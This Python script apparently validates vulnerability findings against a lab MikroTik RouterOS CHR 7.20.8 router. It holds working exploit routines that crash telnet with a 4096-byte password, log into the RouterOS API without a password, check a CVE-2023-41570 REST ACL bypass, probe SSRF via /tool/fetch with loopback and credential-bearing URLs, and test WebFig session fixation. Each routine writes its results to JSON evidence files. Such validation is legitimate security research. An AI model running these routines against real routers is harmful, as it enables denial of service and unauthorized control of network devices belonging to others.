#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Pristine Validation (Remaining 5 Findings)
Target: [REDACTED-INTERNAL-IP] (clean CHR, [REDACTED-CREDS])

Validates:
  2. Telnet buffer overflow crash (4096B password)
  3. RouterOS API login without password attribute
  4. CVE-2023-41570 regression (REST API ACL bypass)
  5. SSRF via /tool/fetch
  6. Session fixation in WebFig
"""

import json, os, socket, struct, sys, time, requests
from datetime import datetime
from pathlib import Path

TARGET = "[REDACTED-INTERNAL-IP]"
ADMIN_USER = "admin"
ADMIN_PASS = "admin"
EVIDENCE_DIR = Path("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/cve-validation")
EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
ROUNDS = 3

requests.packages.urllib3.disable_warnings()

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)

def rest_get(path, user=ADMIN_USER, pw=ADMIN_PASS, timeout=10):
    try:
        r = requests.get(f"http://{TARGET}/rest{path}", auth=(user, pw), timeout=timeout, verify=False)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)

def rest_post(path, data=None, user=ADMIN_USER, pw=ADMIN_PASS, timeout=10):
    try:
        r = requests.post(f"http://{TARGET}/rest{path}", auth=(user, pw), json=data or {},
                          headers={"Content-Type": "application/json"}, timeout=timeout, verify=False)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)

def alive():
    try:
        r = requests.get(f"http://{TARGET}/rest/system/resource", auth=(ADMIN_USER, ADMIN_PASS), timeout=5, verify=False)
        return r.status_code == 200
    except:
        return False

def wait_router(mx=120):
    log(f"  Waiting for router (up to {mx}s)...")
    t0 = time.time()
    while time.time() - t0 < mx:
        if alive():
            time.sleep(3)
            if alive():
                log(f"  Router back after {int(time.time()-t0)}s")
                return True
        time.sleep(5)
    log(f"  Router NOT back within {mx}s!")
    return False

def get_uptime():
    s, r = rest_get("/system/resource")
    if s == 200:
        try: return json.loads(r).get("uptime")
        except: pass
    return None

# RouterOS API helpers
def ros_enc_len(n):
    if n < 0x80: return struct.pack("!B", n)
    elif n < 0x4000: return struct.pack("!H", n | 0x8000)
    elif n < 0x200000:
        b = n | 0xC00000; return struct.pack("!BH", (b >> 16) & 0xFF, b & 0xFFFF)
    elif n < 0x10000000: return struct.pack("!I", n | 0xE0000000)
    else: return b'\xF0' + struct.pack("!I", n)

def ros_word(w):
    if isinstance(w, str): w = w.encode()
    return ros_enc_len(len(w)) + w

def ros_sentence(words):
    return b''.join(ros_word(w) for w in words) + b'\x00'

def ros_read(sock, timeout=10):
    sock.settimeout(timeout)
    words = []
    try:
        while True:
            b = sock.recv(1)
            if not b: break
            f = b[0]
            if f == 0:
                if words: return words
                continue
            if f < 0x80: length = f
            elif f < 0xC0: length = ((f & 0x3F) << 8) | sock.recv(1)[0]
            elif f < 0xE0:
                b2 = sock.recv(2); length = ((f & 0x1F) << 16) | (b2[0] << 8) | b2[1]
            elif f < 0xF0:
                b2 = sock.recv(3); length = ((f & 0x0F) << 24) | (b2[0] << 16) | (b2[1] << 8) | b2[2]
            else:
                b2 = sock.recv(4); length = (b2[0] << 24) | (b2[1] << 16) | (b2[2] << 8) | b2[3]
            data = b''
            while len(data) < length:
                chunk = sock.recv(length - len(data))
                if not chunk: break
                data += chunk
            words.append(data.decode('utf-8', errors='replace'))
    except socket.timeout: pass
    return words

# ══════════════════════════════════════════════════════════════════════════
# VALIDATION 2: Telnet Buffer Overflow Crash
# ══════════════════════════════════════════════════════════════════════════
def validate_telnet_crash():
    log("=" * 70)
    log("VALIDATION 2: Telnet Buffer Overflow Crash (4096-byte password)")
    log("=" * 70)
    results = []

    for rnd in range(1, ROUNDS + 1):
        log(f"\n  Round {rnd}/{ROUNDS}:")
        if not alive():
            wait_router(120)

        pre_up = get_uptime()
        log(f"    Pre-test uptime: {pre_up}")

        result = {"round": rnd, "pre_uptime": pre_up, "ts": datetime.now().isoformat()}
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((TARGET, 23))
            time.sleep(1)
            try: s.recv(4096)  # banner
            except: pass
            s.sendall(b"admin\r\n")
            time.sleep(1)
            try: s.recv(4096)  # password prompt
            except: pass
            log(f"    Sending 4096-byte password...")
            s.sendall(b"A" * 4096 + b"\r\n")
            time.sleep(3)
            try:
                resp = s.recv(4096)
                result["resp_bytes"] = len(resp)
            except Exception as e:
                result["resp_err"] = str(e)
            s.close()
        except Exception as e:
            result["conn_err"] = str(e)

        time.sleep(5)
        if not alive():
            log(f"    🔴 Router DOWN — crash confirmed!")
            result["crashed"] = True
            result["confirmed"] = True
            recovered = wait_router(120)
            result["recovered"] = recovered
            if recovered:
                post_up = get_uptime()
                result["post_uptime"] = post_up
                log(f"    Post-crash uptime: {post_up} (was: {pre_up})")
        else:
            post_up = get_uptime()
            result["post_uptime"] = post_up
            log(f"    Post-test uptime: {post_up} (was: {pre_up})")
            result["crashed"] = False
            result["confirmed"] = False
            log(f"    Router stayed up — NOT confirmed this round")

        results.append(result)
        if rnd < ROUNDS: time.sleep(10)

    c = sum(1 for r in results if r.get("confirmed"))
    log(f"\n  RESULT: {c}/{len(results)} rounds confirmed telnet crash")
    return {"finding": "Telnet Buffer Overflow Crash", "severity": "CRITICAL", "cwe": "CWE-120",
            "confirmed_count": c, "total_tests": len(results),
            "status": "CONFIRMED" if c >= 2 else "PARTIAL" if c > 0 else "NOT CONFIRMED", "results": results}

# ══════════════════════════════════════════════════════════════════════════
# VALIDATION 3: RouterOS API Login Without Password
# ══════════════════════════════════════════════════════════════════════════
def validate_api_no_password():
    log("=" * 70)
    log("VALIDATION 3: RouterOS API Login Without Password Attribute")
    log("=" * 70)
    results = []

    for rnd in range(1, ROUNDS + 1):
        log(f"\n  Round {rnd}/{ROUNDS}:")
        result = {"round": rnd, "ts": datetime.now().isoformat()}
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((TARGET, 8728))
            s.sendall(ros_sentence(['/login', '=name=admin']))
            log(f"    Sent: /login =name=admin (no =password=)")
            resp = ros_read(s)
            log(f"    Response: {resp}")
            result["response"] = resp
            if resp and resp[0] == '!done':
                result["confirmed"] = True
                log(f"    ✅ CONFIRMED: Login succeeded without password!")
                s.sendall(ros_sentence(['/system/identity/print']))
                cmd = ros_read(s)
                result["post_auth_cmd"] = cmd
                log(f"    Post-auth: {cmd}")
            elif resp and resp[0] == '!trap':
                result["confirmed"] = False
                log(f"    ❌ Login denied")
            else:
                result["confirmed"] = False
                log(f"    ❓ Unexpected: {resp}")
            s.close()
        except Exception as e:
            result["error"] = str(e); result["confirmed"] = False
            log(f"    Error: {e}")
        results.append(result)
        time.sleep(2)

    c = sum(1 for r in results if r.get("confirmed"))
    log(f"\n  RESULT: {c}/{len(results)} rounds confirmed passwordless login")
    return {"finding": "RouterOS API Login Without Password", "severity": "CRITICAL", "cwe": "CWE-287",
            "confirmed_count": c, "total_tests": len(results),
            "status": "CONFIRMED" if c >= 2 else "PARTIAL" if c > 0 else "NOT CONFIRMED", "results": results}

# ══════════════════════════════════════════════════════════════════════════
# VALIDATION 4: CVE-2023-41570 Regression (REST API ACL Bypass)
# ══════════════════════════════════════════════════════════════════════════
def validate_acl_bypass():
    log("=" * 70)
    log("VALIDATION 4: CVE-2023-41570 — REST API ACL Bypass")
    log("=" * 70)
    results = []
    endpoints = ["/system/resource", "/system/identity", "/ip/address", "/user", "/ip/service"]

    for rnd in range(1, ROUNDS + 1):
        log(f"\n  Round {rnd}/{ROUNDS}:")
        result = {"round": rnd, "ts": datetime.now().isoformat(), "bypassed": [], "blocked": []}

        # Verify pre-ACL access
        s, _ = rest_get("/system/identity")
        log(f"    Pre-ACL: HTTP {s}")

        # Set IP restriction via REST
        log(f"    Setting www address=[REDACTED-INTERNAL-IP]/32...")
        try:
            r = requests.patch(f"http://{TARGET}/rest/ip/service/www",
                               auth=(ADMIN_USER, ADMIN_PASS),
                               json={"address": "[REDACTED-INTERNAL-IP]/32"},
                               headers={"Content-Type": "application/json"},
                               timeout=10, verify=False)
            log(f"    Set ACL: HTTP {r.status_code}")
        except Exception as e:
            log(f"    Set ACL error: {e}")
        time.sleep(2)

        # Test endpoints through ACL
        for ep in endpoints:
            s, r = rest_get(ep, timeout=5)
            if s == 200:
                result["bypassed"].append(ep)
                log(f"    {ep}: HTTP {s} — ⚠️ BYPASSED")
            else:
                result["blocked"].append(ep)
                log(f"    {ep}: HTTP {s} — blocked")

        # Remove restriction (try REST, fall back to API)
        log(f"    Removing ACL...")
        removed = False
        try:
            r = requests.patch(f"http://{TARGET}/rest/ip/service/www",
                               auth=(ADMIN_USER, ADMIN_PASS),
                               json={"address": ""},
                               headers={"Content-Type": "application/json"},
                               timeout=10, verify=False)
            if r.status_code == 200: removed = True
            log(f"    Remove via REST: HTTP {r.status_code}")
        except:
            pass
        if not removed:
            try:
                api = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                api.settimeout(10)
                api.connect((TARGET, 8728))
                api.sendall(ros_sentence(['/login', f'=name={ADMIN_USER}', f'=password={ADMIN_PASS}']))
                ros_read(api)
                api.sendall(ros_sentence(['/ip/service/set', '=.id=www', '=address=']))
                ros_read(api)
                api.close()
                log(f"    Removed via API")
            except Exception as e:
                log(f"    Remove error: {e}")
        time.sleep(2)

        # Verify restored
        s, _ = rest_get("/system/identity")
        log(f"    Post-removal: HTTP {s}")

        bp = len(result["bypassed"])
        result["confirmed"] = bp > 0
        log(f"    Bypassed: {bp}/{len(endpoints)}")
        results.append(result)

    c = sum(1 for r in results if r.get("confirmed"))
    total_bp = sum(len(r["bypassed"]) for r in results)
    total_ep = sum(len(r["bypassed"]) + len(r["blocked"]) for r in results)
    log(f"\n  RESULT: {c}/{ROUNDS} rounds confirmed ACL bypass ({total_bp}/{total_ep} endpoints)")
    return {"finding": "CVE-2023-41570 Regression — REST API ACL Bypass", "severity": "CRITICAL", "cwe": "CWE-284",
            "confirmed_count": c, "total_tests": ROUNDS, "total_bypassed": total_bp,
            "status": "CONFIRMED" if c >= 2 else "PARTIAL" if c > 0 else "NOT CONFIRMED", "results": results}

# ══════════════════════════════════════════════════════════════════════════
# VALIDATION 5: SSRF via /tool/fetch
# ══════════════════════════════════════════════════════════════════════════
def validate_ssrf():
    log("=" * 70)
    log("VALIDATION 5: SSRF via /tool/fetch")
    log("=" * 70)
    results = []
    vectors = [
        ("localhost_127", "http://127.0.0.1:80/"),
        ("ipv6_loopback", "http://[::1]/"),
        ("embedded_creds", f"http://{ADMIN_USER}:{ADMIN_PASS}@127.0.0.1/rest/system/identity"),
    ]

    for rnd in range(1, ROUNDS + 1):
        log(f"\n  Round {rnd}/{ROUNDS}:")
        for vname, url in vectors:
            log(f"    {vname}: {url}")
            result = {"round": rnd, "vector": vname, "url": url, "ts": datetime.now().isoformat()}
            try:
                r = requests.post(f"http://{TARGET}/rest/tool/fetch",
                                  auth=(ADMIN_USER, ADMIN_PASS),
                                  json={"url": url, "mode": "http", "dst-path": ""},
                                  headers={"Content-Type": "application/json"},
                                  timeout=15, verify=False)
                result["http_status"] = r.status_code
                result["response"] = r.text[:500]
                if r.status_code == 200:
                    result["confirmed"] = True
                    log(f"      ✅ CONFIRMED: HTTP 200 — {r.text[:80]}")
                else:
                    result["confirmed"] = False
                    log(f"      ❌ HTTP {r.status_code}")
            except Exception as e:
                result["error"] = str(e); result["confirmed"] = False
                log(f"      Error: {e}")
            results.append(result)
            time.sleep(1)

    c = sum(1 for r in results if r.get("confirmed"))
    log(f"\n  RESULT: {c}/{len(results)} SSRF tests confirmed")
    return {"finding": "SSRF via /tool/fetch", "severity": "HIGH", "cwe": "CWE-918",
            "confirmed_count": c, "total_tests": len(results),
            "status": "CONFIRMED" if c >= 6 else "PARTIAL" if c > 0 else "NOT CONFIRMED", "results": results}

# ══════════════════════════════════════════════════════════════════════════
# VALIDATION 6: Session Fixation
# ══════════════════════════════════════════════════════════════════════════
def validate_session_fixation():
    log("=" * 70)
    log("VALIDATION 6: Session Fixation in WebFig")
    log("=" * 70)
    results = []

    for rnd in range(1, ROUNDS + 1):
        log(f"\n  Round {rnd}/{ROUNDS}:")
        result = {"round": rnd, "ts": datetime.now().isoformat()}
        try:
            sess = requests.Session()
            sess.cookies.set("session", "FIXED_SESSION_12345678", domain=TARGET)
            r = sess.get(f"http://{TARGET}/rest/system/identity", auth=(ADMIN_USER, ADMIN_PASS),
                         timeout=10, verify=False)
            result["auth_status"] = r.status_code
            result["resp_cookies"] = dict(r.cookies)
            all_cookies = dict(sess.cookies)
            result["all_cookies"] = all_cookies

            r2 = sess.get(f"http://{TARGET}/webfig/", timeout=10, verify=False)
            result["webfig_status"] = r2.status_code
            result["webfig_cookies"] = dict(r2.cookies)
            all_cookies_after = dict(sess.cookies)
            result["all_cookies_after"] = all_cookies_after

            if all_cookies.get("session") == "FIXED_SESSION_12345678":
                result["confirmed"] = True
                log(f"    ✅ CONFIRMED: Fixed session accepted without regeneration")
            elif not r.cookies:
                result["confirmed"] = True
                log(f"    ✅ CONFIRMED: No new session cookie issued")
            else:
                result["confirmed"] = False
                log(f"    ❌ Server regenerated session: {dict(r.cookies)}")
            log(f"    Cookies: {all_cookies_after}")
        except Exception as e:
            result["error"] = str(e); result["confirmed"] = False
            log(f"    Error: {e}")
        results.append(result)
        time.sleep(2)

    c = sum(1 for r in results if r.get("confirmed"))
    log(f"\n  RESULT: {c}/{len(results)} rounds confirmed session fixation")
    return {"finding": "Session Fixation in WebFig", "severity": "HIGH", "cwe": "CWE-384",
            "confirmed_count": c, "total_tests": len(results),
            "status": "CONFIRMED" if c >= 2 else "PARTIAL" if c > 0 else "NOT CONFIRMED", "results": results}

# ══════════════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════════════
def main():
    log("=" * 70)
    log("MikroTik RouterOS CHR 7.20.8 — PRISTINE VALIDATION (Remaining)")
    log(f"Target: {TARGET} (factory-fresh, [REDACTED-CREDS])")
    log("=" * 70)

    if not alive():
        log(f"Cannot reach {TARGET}!"); sys.exit(1)
    log(f"Router: {get_uptime()} uptime")

    all_results = {}
    validators = [
        ("telnet_crash", validate_telnet_crash),
        ("api_no_password", validate_api_no_password),
        ("acl_bypass", validate_acl_bypass),
        ("ssrf", validate_ssrf),
        ("session_fixation", validate_session_fixation),
    ]

    for name, func in validators:
        try:
            result = func()
            all_results[name] = result
            log(f"\n  >>> {name}: {result['status']} ({result['confirmed_count']}/{result['total_tests']})")
        except Exception as e:
            log(f"\n  >>> {name}: ERROR — {e}")
            all_results[name] = {"error": str(e), "status": "ERROR"}
        if not alive():
            log("Router down — waiting...")
            wait_router(120)

    # Summary
    log("\n" + "=" * 70)
    log("PRISTINE VALIDATION SUMMARY (Remaining Findings)")
    log("=" * 70)
    log(f"{'Finding':<50} {'Status':<15} {'Score'}")
    log("-" * 80)
    for name, r in all_results.items():
        f = r.get("finding", name)
        st = r.get("status", "ERROR")
        c = r.get("confirmed_count", "?")
        t = r.get("total_tests", "?")
        icon = "✅" if st == "CONFIRMED" else "⚠️" if st == "PARTIAL" else "❌"
        log(f"{icon} {f:<48} {st:<15} {c}/{t}")
    log("-" * 80)

    # Save
    evidence = {
        "metadata": {"script": "pristine_validate_remaining.py", "phase": 10,
                      "target": TARGET, "version": "7.20.8 (long-term)",
                      "state": "factory-fresh CHR image", "rounds": ROUNDS,
                      "timestamp": datetime.now().isoformat()},
        "validations": all_results,
    }
    out = EVIDENCE_DIR / "pristine_validation_remaining.json"
    with open(out, "w") as f:
        json.dump(evidence, f, indent=2, default=str)
    log(f"\nEvidence: {out}")

    # Router logs
    try:
        r = requests.get(f"http://{TARGET}/rest/log", auth=(ADMIN_USER, ADMIN_PASS), timeout=10, verify=False)
        if r.status_code == 200:
            with open(EVIDENCE_DIR / "pristine_validation_remaining_logs.json", "w") as f:
                json.dump(r.json(), f, indent=2, default=str)
    except: pass

if __name__ == "__main__":
    main()
